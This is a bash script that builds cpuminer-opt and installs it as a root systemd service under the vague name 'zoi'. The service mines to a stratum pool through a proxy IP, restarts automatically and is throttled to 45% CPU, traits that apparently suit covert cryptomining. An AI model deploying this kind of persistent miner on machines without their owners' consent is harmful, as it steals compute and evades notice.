#!/bin/bash
apt-get update && 
apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git &&
sudo sysctl vm.nr_hugepages=128 &&
cd /usr/local/src/ &&
wget https://github.com/JayDDee/cpuminer-opt/archive/v3.8.3.1.tar.gz &&
tar xvzf v3.8.3.1.tar.gz &&
cd cpuminer-opt-3.8.3.1 &&
./autogen.sh &&
CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl &&
make &&
bash -c 'cat <<EOT >>/lib/systemd/system/zoi.service 
[Unit]
Description=zoi
After=network.target
[Service]
ExecStart= /usr/local/src/cpuminer-opt-3.8.3.1/cpuminer -a lyra2z330 -o stratum+tcp://hxx-pool2.chainsilo.com:3032 -u tuandz.180808 -p x -x 144.202.64.98:6262
WatchdogSec=380
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
sudo apt-get install cpulimit -y &&
cpulimit --exe cpuminer --limit 45 -b &&
#!/bin/bash
systemctl daemon-reload &&
systemctl enable zoi.service &&
service zoi start
